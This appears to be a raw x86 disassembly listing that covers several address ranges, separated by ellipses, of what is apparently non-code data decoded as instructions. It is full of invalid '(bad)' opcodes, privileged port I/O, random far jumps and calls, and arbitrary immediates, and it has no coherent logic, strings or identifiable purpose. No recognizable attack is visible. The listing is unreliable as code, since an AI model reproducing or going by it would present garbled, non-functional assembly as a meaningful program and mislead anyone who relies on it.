  42b17b:	test   BYTE PTR cs:[ebx+0x31],0xef
  42b180:	stc    
  42b181:	ins    DWORD PTR es:[edi],dx
  42b182:	pop    edi
  42b183:	lock xlat BYTE PTR ds:[ebx]
  42b185:	add    ecx,edx
  42b187:	push   edi
  42b188:	and    eax,0xf816b82e
  42b18d:	xor    eax,0xd227232a
  42b192:	dec    ebx
  42b193:	dec    ebx
  42b194:	mov    dl,0x2d
  42b196:	mul    BYTE PTR [esi]
  42b198:	jno    0x42b15b
  42b19a:	sub    bh,BYTE PTR [ecx]
  42b19c:	test   dh,ch
  42b19e:	lds    ebp,FWORD PTR [edi+0xec02270]
  42b1a4:	xor    DWORD PTR [esp+ebx*2-0x22],ebx
  42b1a8:	imul   DWORD PTR [edx+0x20b089de]
  42b1ae:	pop    edx
  42b1af:	dec    ebp
  42b1b0:	mov    cs,WORD PTR [eax+ebx*2]
  42b1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1b4:	mov    eax,0x9e78d02d
  42b1b9:	sbb    eax,0x4e10c03a
  42b1be:	(bad)  
  42b1bf:	mov    cl,0xa7
  42b1c1:	jecxz  0x42b19c
  42b1c3:	adc    esp,ecx
  42b1c5:	pushf  
  42b1c6:	outs   dx,BYTE PTR ds:[esi]
  42b1c7:	hlt    
  42b1c8:	dec    ecx
  42b1c9:	lock mov ah,0x62
  42b1cc:	aaa    
  42b1cd:	ror    BYTE PTR [ebx],1
  42b1cf:	dec    edi
  42b1d0:	enter  0x9ee5,0x4c
  42b1d4:	xchg   edi,eax
  42b1d5:	jno    0x42b224
  42b1d7:	jbe    0x42b243
  42b1d9:	mov    dh,BYTE PTR [eax-0x7a]
  42b1dc:	xchg   BYTE PTR [eax+0x4c83a1d],dl
  42b1e2:	xor    eax,0xa1004d41
  42b1e7:	sbb    BYTE PTR [edx-0x70],ch
  42b1ea:	push   0x73b5ca16
  42b1ef:	mov    edi,edx
  42b1f1:	fucom  st(2)
  42b1f3:	into   
  42b1f4:	xor    DWORD PTR [ebx*4+0x7cd618cf],edi
  42b1fb:	and    ebx,ebx
  42b1fd:	test   eax,0x3518e1fc
  42b202:	rol    BYTE PTR [eax+0x11],0x16
  42b206:	mov    dh,0x11
  42b208:	daa    
  42b209:	pushf  
  42b20a:	dec    eax
  42b20b:	ss sbb edi,esp
  42b20e:	pusha  
  42b20f:	xor    BYTE PTR [edx+0x5f],dl
  42b212:	clc    
  42b213:	fidivr DWORD PTR [eax+0x29]
  42b216:	or     bh,dh
  42b218:	repnz pop ss
  42b21a:	xchg   ebp,eax
  42b21b:	jl     0x42b283
  42b21d:	aaa    
  42b21e:	dec    esp
  42b21f:	adc    DWORD PTR [eax-0x46241769],esp
  42b225:	and    dh,cl
  42b227:	mov    al,0x2e
  42b229:	or     DWORD PTR [edx],ebp
  42b22b:	mov    DWORD PTR ds:0x198ac44a,eax
  42b231:	fxam   
  42b233:	ret    0x1
	...
  42b296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b297:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp-0x3d],ch
  42b2a3:	test   bh,cl
  42b2a5:	xor    al,0xb5
  42b2a7:	int    0x1
  42b2a9:	add    BYTE PTR [edi],al
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    BYTE PTR [edi-0x4e],cl
  42b2b0:	pop    ecx
  42b2b1:	nop
  42b2b2:	(bad)  
  42b2b4:	retf   0x2322
  42b2b7:	jp     0x42b265
  42b2b9:	adc    bl,BYTE PTR [esp]
  42b2bc:	ret    0x4c10
  42b2bf:	jno    0x42b289
  42b2c1:	and    dh,bl
  42b2c3:	push   0x3f68b3b7
  42b2c8:	xchg   ebp,eax
  42b2c9:	sti    
  42b2ca:	or     bh,bh
  42b2cc:	sti    
  42b2cd:	popa   
  42b2ce:	lods   eax,DWORD PTR ds:[esi]
  42b2cf:	push   esi
  42b2d0:	pusha  
  42b2d1:	xchg   ebp,eax
  42b2d2:	(bad)  
  42b2d3:	into   
  42b2d4:	stos   BYTE PTR es:[edi],al
  42b2d5:	retf   0x4df4
  42b2d8:	pusha  
  42b2d9:	inc    ebp
  42b2da:	repz inc ecx
  42b2dc:	mov    ch,0x1d
  42b2de:	in     al,0x50
  42b2e0:	aas    
  42b2e1:	loopne 0x42b34c
  42b2e3:	xor    BYTE PTR [ebx],dl
  42b2e5:	and    esi,DWORD PTR [ecx+0x57449a25]
  42b2eb:	into   
  42b2ec:	mov    eax,0x5029cc3d
  42b2f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2f2:	loop   0x42b277
  42b2f4:	xchg   DWORD PTR [ebp-0x338243bc],ebp
  42b2fa:	push   ds
  42b2fb:	and    BYTE PTR [ecx],cl
  42b2fd:	aaa    
  42b2fe:	or     DWORD PTR [esi-0x2a],ebx
  42b301:	outs   dx,BYTE PTR ds:[esi]
  42b302:	pop    ebp
  42b303:	bound  esi,QWORD PTR [edx+eiz*1]
  42b306:	pusha  
  42b307:	push   cs
  42b308:	add    dl,bh
  42b30a:	das    
  42b30b:	jbe    0x42b2b0
  42b30d:	ror    ecx,0x7f
  42b310:	push   edi
  42b311:	pop    es
  42b312:	fimul  DWORD PTR [edx+0x79]
  42b315:	loop   0x42b32a
  42b317:	in     al,0x6b
  42b319:	mov    ds:0xf41d7747,al
  42b31e:	ret    
  42b31f:	mov    ecx,0x6a21e85e
  42b324:	fisttp DWORD PTR [eax-0x11568e2b]
  42b32a:	jecxz  0x42b37b
  42b32c:	mov    edx,0x1418439e
  42b331:	adc    esi,ebp
  42b333:	mov    ecx,0xe5c3e4d0
  42b338:	dec    ebp
  42b339:	dec    esp
  42b33a:	jmp    0x42b2fb
  42b33c:	sbb    bh,BYTE PTR [ecx+eiz*8]
  42b33f:	dec    edx
  42b340:	leave  
  42b341:	jnp    0x42b36a
  42b343:	xlat   BYTE PTR ds:[ebx]
  42b344:	dec    edi
  42b345:	inc    esp
  42b346:	loope  0x42b2ee
  42b348:	in     eax,0x77
  42b34a:	mov    ebx,0x68d41f4f
  42b34f:	in     eax,0x90
  42b351:	sub    eax,0x3d26f22a
  42b356:	cmp    al,0x67
  42b358:	daa    
  42b359:	and    esp,DWORD PTR [ecx-0x40]
  42b35c:	mov    ah,0xa6
  42b35e:	fst    DWORD PTR [edx]
  42b360:	mov    al,dl
  42b362:	or     eax,DWORD PTR [esi-0x17]
  42b365:	xchg   edx,eax
  42b366:	jns    0x42b2ec
  42b368:	add    al,0xff
  42b36a:	mov    esp,DWORD PTR [ebx-0x64]
  42b36d:	shr    DWORD PTR [ebx-0x4e316c9d],0xa
  42b374:	and    bh,ch
  42b376:	and    dl,BYTE PTR [esi+ebp*1]
  42b379:	pop    ebx
  42b37a:	shl    BYTE PTR [ecx-0x644bfd28],1
  42b380:	ret    0xbd94
  42b383:	(bad)  
  42b384:	push   ss
  42b385:	sbb    al,0xa1
  42b387:	rcl    BYTE PTR [ebp-0x26],0x78
  42b38b:	mov    ch,0xa0
  42b38d:	mov    ch,0x72
  42b38f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b390:	pop    ecx
  42b391:	push   edx
  42b392:	mov    esp,0x4333bca8
  42b397:	pop    edx
  42b398:	or     bh,ch
  42b39a:	dec    ebp
  42b39b:	or     eax,DWORD PTR [esi]
  42b39d:	dec    edi
  42b39e:	push   ebx
  42b39f:	daa    
  42b3a0:	stc    
  42b3a1:	stos   BYTE PTR es:[edi],al
  42b3a2:	stc    
  42b3a3:	cwde   
  42b3a4:	mov    ds:0x72538f9f,al
  42b3a9:	xchg   ebx,eax
  42b3aa:	adc    bh,ah
  42b3ac:	mov    eax,0x1d9580fe
  42b3b1:	jg     0x42b42e
  42b3b3:	lods   eax,DWORD PTR ds:[esi]
  42b3b4:	jnp    0x42b3b6
	...
  42b416:	mov    al,BYTE PTR [ebp+0x20]
  42b419:	out    dx,al
  42b41a:	out    dx,eax
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0x9e
  42b423:	pop    ds
  42b424:	out    0x3f,al
  42b426:	mov    esp,0x70001ce
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR [edx+0x69],bl
  42b430:	jg     0x42b48a
  42b432:	stos   DWORD PTR es:[edi],eax
  42b433:	test   bh,ch
  42b435:	mov    ch,0xbf
  42b437:	fsubp  st(0),st
  42b439:	jge    0x42b42b
  42b43b:	int3   
  42b43c:	mov    ebx,0x4946ed5a
  42b441:	aad    0xe0
  42b443:	clc    
  42b444:	jge    0x42b4be
  42b446:	iret   
  42b447:	repnz push 0xffffffd3
  42b44a:	push   ecx
  42b44b:	sub    eax,0x4e082b88
  42b450:	lahf   
  42b451:	loop   0x42b3fa
  42b453:	xchg   edi,eax
  42b454:	dec    esp
  42b455:	mov    ebp,0xfcdc71e7
  42b45a:	jns    0x42b4da
  42b45c:	pop    es
  42b45d:	cmp    DWORD PTR [esi-0x7e50f749],ebx
  42b463:	(bad)  
  42b464:	(bad)  
  42b465:	out    dx,al
  42b466:	add    al,0x56
  42b468:	xchg   edx,eax
  42b469:	fisttp QWORD PTR [eax+0x4b]
  42b46c:	or     ah,cl
  42b46e:	rol    DWORD PTR [ecx],cl
  42b470:	(bad)  
  42b471:	sub    eax,0xf34c9e0f
  42b476:	stos   BYTE PTR es:[edi],al
  42b477:	adc    ch,BYTE PTR [edi+0x1f]
  42b47a:	adc    bh,BYTE PTR [ebx+0x23]
  42b47d:	jg     0x42b41b
  42b47f:	mov    dh,0xba
  42b481:	test   edi,esi
  42b483:	es mov dh,0xc2
  42b486:	sub    eax,0x15f829aa
  42b48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b48c:	inc    edx
  42b48d:	sbb    al,0xa7
  42b48f:	and    al,0xc5
  42b491:	scas   eax,DWORD PTR es:[edi]
  42b492:	aaa    
  42b493:	int    0xf6
  42b495:	int3   
  42b496:	pop    ebp
  42b497:	xchg   edi,eax
  42b498:	sbb    cl,BYTE PTR [eax-0x45271d43]
  42b49e:	jns    0x42b4b6
  42b4a0:	xchg   DWORD PTR [ebx-0x54],esp
  42b4a3:	or     dh,dl
  42b4a5:	aas    
  42b4a6:	lds    esi,FWORD PTR [edi]
  42b4a8:	in     al,dx
  42b4a9:	mov    dh,0x1e
  42b4ab:	loop   0x42b523
  42b4ad:	xlat   BYTE PTR ds:[ebx]
  42b4ae:	scas   eax,DWORD PTR es:[edi]
  42b4af:	inc    esi
  42b4b0:	mov    cl,0xfa
  42b4b2:	jle    0x42b44b
  42b4b4:	mov    BYTE PTR [ecx-0x3],dh
  42b4b7:	imul   edx,DWORD PTR [ecx-0x2a3f37a9],0x50a9cfd2
  42b4c1:	mov    fs,WORD PTR [edi-0x6]
  42b4c4:	shr    DWORD PTR [ebp-0x47496b09],cl
  42b4ca:	cwde   
  42b4cb:	(bad)  
  42b4cc:	mov    edx,0xd33d9704
  42b4d1:	aad    0x9d
  42b4d3:	leave  
  42b4d4:	push   edx
  42b4d5:	outs   dx,DWORD PTR ds:[esi]
  42b4d6:	lds    ecx,FWORD PTR [edi]
  42b4d8:	inc    ebp
  42b4d9:	aad    0x13
  42b4db:	xchg   edx,eax
  42b4dc:	add    ebx,esp
  42b4de:	je     0x42b46f
  42b4e0:	mov    ah,0xf1
  42b4e2:	fdivrp st(7),st
  42b4e4:	jbe    0x42b52b
  42b4e6:	sub    BYTE PTR [ebp-0x4f898ae6],0x73
  42b4ed:	or     eax,0xabdea917
  42b4f2:	adc    BYTE PTR [ecx],al
  42b4f4:	pusha  
  42b4f5:	xor    al,0x43
  42b4f7:	in     al,dx
  42b4f8:	push   eax
  42b4f9:	out    dx,al
  42b4fa:	xchg   edx,eax
  42b4fb:	es jge 0x42b569
  42b4fe:	lods   eax,DWORD PTR ds:[esi]
  42b4ff:	fwait
  42b500:	aas    
  42b501:	push   edi
  42b502:	ds cmc 
  42b504:	jmp    0xbfed:0x9fdd9c95
  42b50b:	sub    bh,BYTE PTR [edi+0x77]
  42b50e:	repnz mov eax,DWORD PTR [ecx+edx*2-0x26]
  42b513:	cmp    ebp,DWORD PTR [ebx]
  42b515:	push   ebx
  42b516:	mov    ebx,0x5728d401
  42b51b:	cwde   
  42b51c:	in     eax,0x7e
  42b51e:	jmp    FWORD PTR [edi-0x1e]
  42b521:	mov    esp,0x97c4bacb
  42b526:	data16 fist DWORD PTR [eax]
  42b529:	add    cl,BYTE PTR [ebx+0x222fb449]
  42b52f:	clc    
  42b530:	jo     0x42b4e0
  42b532:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b534:	pop    ecx
	...
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	push   esp
  42b5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5a4:	sbb    edi,DWORD PTR [edx+0x1cfc3]
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR [edx+0x26],dl
  42b5b0:	dec    esp
  42b5b1:	sbb    cl,ah
  42b5b3:	mov    ecx,0x1da5ae85
  42b5b8:	(bad)
  42b5bd:	sbb    ch,BYTE PTR [edx+0x66]
  42b5c0:	jnp    0x42b585
  42b5c2:	mov    al,ds:0x8320117a
  42b5c7:	rol    bl,0xa1
  42b5ca:	in     eax,dx
  42b5cb:	xor    BYTE PTR es:[edi+0x68],cl
  42b5cf:	test   BYTE PTR [ebx],ch
  42b5d1:	xchg   esp,eax
  42b5d2:	jno    0x42b55b
  42b5d4:	ror    DWORD PTR [edx],0xfa
  42b5d7:	jmp    0x6ea2:0x3393c9a5
  42b5de:	xor    eax,0xd49a7553
  42b5e3:	add    al,0x2b
  42b5e5:	and    bh,bl
  42b5e7:	stc    
  42b5e8:	aas    
  42b5e9:	pop    edx
  42b5ea:	pop    es
  42b5eb:	or     eax,0xf44428f4
  42b5f0:	fld    QWORD PTR [esi-0x5d]
  42b5f3:	test   ecx,edx
  42b5f5:	ss data16 mov cl,0xff
  42b5f9:	push   ebp
  42b5fa:	mov    bh,0x19
  42b5fc:	jecxz  0x42b5e5
  42b5fe:	in     eax,dx
  42b5ff:	inc    eax
  42b600:	push   edx
  42b601:	xor    DWORD PTR [ecx],0xffffffce
  42b604:	idiv   DWORD PTR [edx]
  42b606:	jle    0x42b5c7
  42b608:	sbb    eax,edx
  42b60a:	adc    dh,BYTE PTR [esi+eiz*2+0x31]
  42b60e:	outs   dx,DWORD PTR ds:[esi]
  42b60f:	push   edi
  42b610:	(bad)  
  42b611:	fisubr DWORD PTR [esi+0x48c7c5ff]
  42b617:	xchg   edx,eax
  42b618:	popf   
  42b619:	sub    bl,al
  42b61b:	xor    dl,BYTE PTR ds:0x349ad52a
  42b621:	aas    
  42b622:	pop    eax
  42b623:	add    eax,0x694da34
  42b628:	xchg   DWORD PTR [eax+0x60],ebp
  42b62b:	cdq    
  42b62c:	sbb    ebx,DWORD PTR [esi]
  42b62e:	xor    bh,BYTE PTR [ebp+0x5f813e7d]
  42b634:	jb     0x42b617
  42b636:	and    al,0xce
  42b638:	inc    esi
  42b639:	mov    bl,0xbf
  42b63b:	sub    al,0xab
  42b63d:	adc    eax,0xb3f03fe4
  42b642:	outs   dx,BYTE PTR ds:[esi]
  42b643:	mov    edi,DWORD PTR [esi]
  42b645:	push   esp
  42b646:	pop    ecx
  42b647:	xor    al,0xba
  42b649:	xor    al,BYTE PTR [ebp+0x5a54da03]
  42b64f:	push   0xd5b39376
  42b654:	sub    al,0x54
  42b656:	aaa    
  42b657:	out    0x32,eax
  42b659:	pop    es
  42b65a:	sub    al,0xf5
  42b65c:	rcr    ebp,cl
  42b65e:	clc    
  42b65f:	out    0xd8,eax
  42b661:	mov    bh,0x4b
  42b663:	mov    al,ds:0xf9397103
  42b668:	xchg   ecx,eax
  42b669:	or     al,dl
  42b66b:	or     DWORD PTR [ebx-0x76],edi
  42b66e:	push   cs
  42b66f:	push   cs
  42b670:	lock pop edx
  42b672:	scas   al,BYTE PTR es:[edi]
  42b673:	scas   eax,DWORD PTR es:[edi]
  42b674:	es mov ch,0xc1
  42b677:	sbb    edi,ecx
  42b679:	sub    al,0xa2
  42b67b:	js     0x42b6e9
  42b67d:	fs stos DWORD PTR es:[edi],eax
  42b67f:	mov    ds:0x8bb8cba,al
  42b684:	aad    0xa7
  42b686:	push   cs
  42b687:	js     0x42b685
  42b689:	addr16 adc dl,0x23
  42b68d:	sbb    DWORD PTR [edi-0x653b57e6],0x47d2f1e8
  42b697:	dec    eax
  42b698:	mov    eax,ds:0x7e57acba
  42b69d:	xor    esi,DWORD PTR [edx-0x44d5fb4a]
  42b6a3:	and    DWORD PTR [bp+0x46],edi
  42b6a7:	sahf   
  42b6a8:	inc    ecx
  42b6a9:	push   ebp
  42b6aa:	inc    ebp
  42b6ab:	xor    al,BYTE PTR [edi-0x4d]
  42b6ae:	cmp    edx,0x3b1672d1
  42b6b4:	cmp    eax,0x0
	...
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp+0x40],bl
  42b723:	stos   DWORD PTR es:[edi],eax
  42b724:	xchg   esp,eax
  42b725:	inc    esp
  42b726:	retf   0x1d0
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    BYTE PTR [ecx+0x549f168b],al
  42b733:	sub    DWORD PTR [ebx-0x69934e34],esi
  42b739:	sub    edi,DWORD PTR [ecx+ebx*4]
  42b73c:	cs jp  0x42b6c2
  42b73f:	and    esi,ecx
  42b741:	aam    0x5b
  42b743:	dec    ebp
  42b744:	mov    al,ds:0x5d9a26e
  42b749:	mov    BYTE PTR [ebx-0x69],bl
  42b74c:	inc    ebx
  42b74d:	imul   DWORD PTR [eax+0x2e053391]
  42b753:	mov    BYTE PTR [ebx+0x3096522],dh
  42b759:	test   BYTE PTR [ecx+0x29],cl
  42b75c:	jge    0x42b7a4
  42b75e:	sub    ah,BYTE PTR [esi]
  42b760:	sbb    BYTE PTR [edi],bh
  42b762:	sbb    DWORD PTR [edi],ecx
  42b764:	cmp    al,0x41
  42b766:	test   BYTE PTR [edi+0x6],bh
  42b769:	inc    edx
  42b76a:	call   0xac58:0xcd3d4670
  42b771:	inc    ebx
  42b772:	or     bl,cl
  42b774:	rol    BYTE PTR ss:[eax+0x4e],1
  42b778:	ret    
  42b779:	add    al,0x82
  42b77b:	std    
  42b77c:	xchg   esi,eax
  42b77d:	sbb    cl,BYTE PTR [ebx+0x2e]
  42b780:	in     eax,0xb6
  42b782:	nop
  42b783:	jne    0x42b7e0
  42b785:	and    eax,ebx
  42b787:	sahf   
  42b788:	push   0xffffffaf
  42b78a:	push   es
  42b78b:	hlt    
  42b78c:	daa    
  42b78d:	lock icebp 
  42b78f:	(bad)  
  42b791:	mov    ebp,DWORD PTR [ebp-0xd]
  42b794:	dec    ebp
  42b795:	dec    eax
  42b796:	pop    ds
  42b797:	sbb    eax,0x506a0ee4
  42b79c:	mov    eax,0xea05bd4
  42b7a1:	std    
  42b7a2:	pop    edx
  42b7a3:	aaa    
  42b7a4:	add    al,BYTE PTR cs:[eax]
  42b7a7:	cld    
  42b7a8:	push   ss
  42b7a9:	aas    
  42b7aa:	pop    esi
  42b7ab:	adc    eax,0xfa4669be
  42b7b0:	mov    edi,0x4b85720e
  42b7b5:	sbb    eax,0x5ade73e8
  42b7ba:	mov    cl,0xa6
  42b7bc:	and    BYTE PTR [ebx+0x2182ad12],dh
  42b7c2:	ret    0x7b5d
  42b7c5:	gs ss jae 0x42b7be
  42b7c9:	xor    edx,DWORD PTR [edi+0x4d]
  42b7cc:	in     eax,0x90
  42b7ce:	xor    DWORD PTR [eax+edi*2+0x34],eax
  42b7d2:	dec    edi
  42b7d3:	fdiv   QWORD PTR [esi+0x6f248f10]
  42b7d9:	in     al,dx
  42b7da:	cld    
  42b7db:	ror    DWORD PTR [eax],cl
  42b7dd:	or     ch,BYTE PTR [esi]
  42b7df:	cmc    
  42b7e0:	cmp    edx,ecx
  42b7e2:	dec    edx
  42b7e3:	into   
  42b7e4:	aas    
  42b7e5:	jg     0x42b80e
  42b7e7:	jb     0x42b7c5
  42b7e9:	repz and bl,BYTE PTR [esi+eiz*8+0x53]
  42b7ee:	fwait
  42b7ef:	mov    ds:0x7b40190c,al
  42b7f4:	sahf   
  42b7f5:	fsub   DWORD PTR [eax+ebp*4]
  42b7f8:	mov    al,ds:0x98b03fe8
  42b7fd:	inc    ebx
  42b7fe:	popf   
  42b7ff:	iret   
  42b800:	loop   0x42b833
  42b802:	das    
  42b803:	jmp    0xe2e3:0x1ed9a7c9
  42b80a:	out    dx,al
  42b80b:	mov    bl,bh
  42b80d:	mov    DWORD PTR [edi+0x65c691ba],edx
  42b813:	stos   DWORD PTR es:[edi],eax
  42b814:	stos   BYTE PTR es:[edi],al
  42b815:	dec    edx
  42b816:	outs   dx,BYTE PTR ds:[esi]
  42b817:	push   edx
  42b818:	int3   
  42b819:	mov    bh,0x7c
  42b81b:	sub    BYTE PTR [ebx],0xb6
  42b81e:	add    DWORD PTR [ebx],0xaa961229
  42b824:	xor    al,0x83
  42b826:	imul   ebx,esi,0x56
  42b829:	nop
  42b82a:	ss adc al,0xd1
  42b82d:	icebp  
  42b82e:	dec    ebx
  42b82f:	and    al,ch
  42b831:	mov    al,ds:0x8025de
	...
  42b896:	call   0x2a7738
  42b89b:	out    0xf9,eax
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi-0x5b094ef9]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [esi+edi*4+0x7a],dl
  42b8b1:	(bad)  
  42b8b2:	shl    BYTE PTR [eax+ebx*1-0x30ae35de],1
  42b8b9:	dec    ebp
  42b8ba:	mov    cl,0x19
  42b8bc:	out    0x1d,al
  42b8be:	mov    bl,0x7e
  42b8c0:	or     BYTE PTR [ebp-0x3e2ffb9c],al
  42b8c6:	xchg   ebx,eax
  42b8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b8c8:	mov    edi,DWORD PTR [edx]
  42b8ca:	shl    DWORD PTR [esi+0x16a9b120],1
  42b8d0:	sub    edi,DWORD PTR [edx-0x70]
  42b8d3:	pop    esp
  42b8d4:	fistp  QWORD PTR [ecx-0x548f8fe4]
  42b8da:	and    esp,DWORD PTR [edx-0x1c]
  42b8dd:	inc    esp
  42b8de:	xchg   esi,eax
  42b8df:	sbb    DWORD PTR [ebp+0x5],edx
  42b8e2:	inc    ebx
  42b8e3:	clc    
  42b8e4:	iret   
  42b8e5:	push   ss
  42b8e6:	jbe    0x42b892
  42b8e8:	pop    ds
  42b8e9:	call   0x845a:0x6cfea512
  42b8f0:	or     eax,0x35d712ca
  42b8f5:	and    eax,0x7e96a543
  42b8fa:	jns    0x42b8cc
  42b8fc:	pop    ecx
  42b8fd:	dec    eax
  42b8fe:	xor    eax,0xa787804e
  42b903:	push   eax
  42b904:	pop    esp
  42b905:	push   cs
  42b906:	pop    edx
  42b907:	xchg   edi,eax
  42b908:	cwde   
  42b909:	pop    edx
  42b90a:	loopne 0x42b8d9
  42b90c:	lahf   
  42b90d:	inc    ax
  42b90f:	push   esp
  42b910:	(bad)  
  42b912:	push   eax
  42b913:	lods   al,BYTE PTR ds:[esi]
  42b914:	out    0xac,eax
  42b916:	pavgw  mm6,QWORD PTR [esi]
  42b919:	fmul   QWORD PTR [edx]
  42b91b:	call   0x789b:0x36c4ce94
  42b922:	pusha  
  42b923:	pushf  
  42b924:	(bad)  
  42b925:	ins    BYTE PTR es:[edi],dx
  42b926:	lahf   
  42b927:	jp     0x42b995
  42b929:	jae    0x42b8b8
  42b92b:	pop    edi
  42b92c:	sbb    ebx,DWORD PTR [ecx+ebx*4]
  42b92f:	or     DWORD PTR [edi+0x1df955e7],esi
  42b935:	cs jmp 0x42b8fb
  42b938:	outs   dx,BYTE PTR ds:[esi]
  42b939:	pop    edx
  42b93a:	mov    DWORD PTR [eax],ebx
  42b93c:	cmp    dh,BYTE PTR [eax+ebx*8-0x59899313]
  42b943:	in     eax,dx
  42b944:	and    eax,0x713f433d
  42b949:	fadd   QWORD PTR [esi]
  42b94b:	mov    cl,BYTE PTR [esi]
  42b94d:	cmc    
  42b94e:	adc    BYTE PTR [esi-0x530ea5a3],cl
  42b954:	cld    
  42b955:	(bad)  
  42b956:	adc    al,dh
  42b958:	fld    QWORD PTR [eax+0x3ca3d058]
  42b95e:	inc    ecx
  42b95f:	fisttp QWORD PTR [edx]
  42b961:	loope  0x42b9c4
  42b963:	sub    DWORD PTR [ebp-0x48],edi
  42b966:	pop    ss
  42b967:	pop    edi
  42b968:	neg    DWORD PTR [edi+ebp*8+0x64248c53]
  42b96f:	bt     DWORD PTR [eax-0x71],ecx
  42b973:	popa   
  42b974:	fcos   
  42b976:	jmp    0x85c1:0xe30bbba2
  42b97d:	test   DWORD PTR [edx+0x68469521],edi
  42b983:	dec    esi
  42b984:	test   DWORD PTR [ebx+0x60ae262e],edx
  42b98a:	imul   ebp,DWORD PTR [eax+0x6a],0x404cbbb9
  42b991:	mov    bl,0x4b
  42b993:	add    bp,dx
  42b996:	dec    esp
  42b997:	inc    esi
  42b998:	mov    eax,esp
  42b99a:	aaa    
  42b99b:	cmp    DWORD PTR [ebp-0x661f5412],0x3b9367a9
  42b9a5:	es xchg edx,eax
  42b9a7:	jae    0x42b9ff
  42b9a9:	add    cl,BYTE PTR [edi-0x3c079c48]
  42b9af:	dec    esp
  42b9b0:	lods   al,BYTE PTR ds:[esi]
  42b9b1:	in     al,0x42
  42b9b3:	nop
  42b9b4:	out    dx,al
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fldcw  WORD PTR [ecx]
  42ba23:	dec    edi
  42ba24:	mov    BYTE PTR [edx-0x28],bl
  42ba27:	rol    BYTE PTR [ecx],cl
  42ba29:	add    BYTE PTR [edi],al
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    dh,bl
  42ba2f:	sbb    esi,ebx
  42ba31:	inc    esp
  42ba32:	dec    ebp
  42ba33:	call   0x968702dc
  42ba38:	or     BYTE PTR [edx+0x559e02a8],bh
  42ba3e:	and    esi,ebx
  42ba40:	or     esp,esi
  42ba42:	mov    ?,WORD PTR [edi+0x42]
  42ba45:	addr16 mov esi,0x2318c738
  42ba4b:	out    0x5f,eax
  42ba4d:	call   0xad4a:0x81ffdec8
  42ba54:	test   al,0x90
  42ba56:	retf   
  42ba57:	sbb    eax,0xbc784410
  42ba5c:	push   es
  42ba5d:	ss dec ecx
  42ba5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba60:	iret   
  42ba61:	mov    al,ds:0xe9c4af32
  42ba66:	fsub   st(6),st
  42ba68:	mov    ch,0x21
  42ba6a:	shl    BYTE PTR [esi-0x54],0xef
  42ba6e:	xor    ch,BYTE PTR [eax+0x6775cf8b]
  42ba74:	add    DWORD PTR [ecx],0xfffffffc
  42ba77:	fisttp WORD PTR [ebx+0x7d]
  42ba7a:	dec    eax
  42ba7b:	pop    esi
  42ba7c:	idiv   DWORD PTR [ebx+0x58]
  42ba7f:	inc    esp
  42ba80:	call   0xd1ec:0x47867261
  42ba87:	addr16 push 0x6e
  42ba8a:	dec    ebx
  42ba8b:	jo     0x42ba90
  42ba8d:	sbb    DWORD PTR [esi+0x6e281058],edi
  42ba93:	call   0xe99c:0xf451a2e4
  42ba9a:	inc    esp
  42ba9b:	les    esi,FWORD PTR [ecx-0x18]
  42ba9e:	mov    ch,bl
  42baa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42baa1:	sbb    eax,0x6e196a16
  42baa6:	adc    al,0xfe
  42baa8:	push   eax
  42baa9:	sahf   
  42baaa:	dec    ecx
  42baab:	shl    DWORD PTR [ebp+0x55],0x36
  42baaf:	pop    eax
  42bab0:	out    dx,eax
  42bab1:	call   0x82cd6645
  42bab6:	inc    ebp
  42bab7:	ins    BYTE PTR es:[edi],dx
  42bab8:	inc    ebx
  42bab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42baba:	scas   eax,DWORD PTR es:[edi]
  42babb:	push   ds
  42babc:	icebp  
  42babd:	in     eax,0x69
  42babf:	cli    
  42bac0:	ss test al,0x56
  42bac3:	push   edx
  42bac4:	(bad)  [edi+ecx*1+0x77da2018]
  42bacb:	(bad)  
  42bacc:	leave  
  42bacd:	xchg   ebp,eax
  42bace:	jo     0x42ba76
  42bad0:	js     0x42badf
  42bad2:	push   edx
  42bad3:	inc    ebp
  42bad4:	ds mov eax,0x1cceba7e
  42bada:	dec    esp
  42badb:	xchg   ebx,eax
  42badc:	push   esp
  42badd:	xor    esp,0x69
  42bae0:	scas   al,BYTE PTR es:[edi]
  42bae1:	jb     0x42bb5a
  42bae3:	push   ds
  42bae4:	mov    eax,0x1458f07d
  42bae9:	aaa    
